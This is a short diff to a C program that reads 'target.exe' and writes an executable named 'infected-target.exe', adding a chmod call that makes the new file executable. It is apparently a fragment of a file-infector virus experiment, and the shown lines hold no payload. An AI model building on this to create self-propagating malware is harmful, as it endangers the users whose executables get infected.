@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <fcntl.h>
+#include <sys/stat.h>
 
 int main()
 {
@@ -11,7 +13,11 @@ int main()
 
 	FILE *fileptr = fopen("target.exe", "rb");
 
+	// create file and set permissions
 	FILE *infptr = fopen("infected-target.exe", "wb");
+	const char filepath[] = "./infected-target.exe";
+	mode_t permissions = S_IRWXU;
+	chmod(filepath, permissions);
 
 	size_t bytes_read = fread(buffer, 1, 7328, fileptr);
 
